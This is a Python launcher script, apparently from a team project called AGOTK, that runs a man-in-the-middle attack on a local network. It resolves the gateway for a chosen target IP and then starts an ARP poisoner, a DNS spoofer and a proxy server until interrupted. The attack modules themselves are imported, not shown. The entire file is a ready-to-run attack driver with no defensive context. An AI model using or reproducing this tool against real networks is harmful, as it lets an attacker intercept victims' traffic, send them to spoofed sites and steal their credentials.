from AGOTK.proxy import MyProxy
import sys
import argparse
from AGOTK import ARPPoisoner
from AGOTK import DNSSpoofer
from AGOTK import ProxyServer
from scapy.all import *

def main(argv) -> None:
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=str, required=True, help='The interface to use')

    # So that the IP is not hardcoded, Luc can replace with selection
    parser.add_argument('-t', '--target', type=str, required=True, help='The ip address of the target')

    args = parser.parse_args()

    interface: str = args.interface
    ip_target: str = args.target

    target_route: Route = conf.route.route(ip_target)
    ip_gateway: str = conf.route.route(target_route[2])[2]

    arp_poisoner: ARPPoisoner = ARPPoisoner(interface, ip_target, ip_gateway)
    arp_poisoner.start()

    dns_spoofer: DNSSpoofer = DNSSpoofer(interface)
    dns_spoofer.start()

    proxy_server: ProxyServer = ProxyServer()
    proxy_server.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\nExit...")
        arp_poisoner.stop()
        dns_spoofer.stop()
        proxy_server.stop()

if __name__ == "__main__":
    main(sys.argv[1:])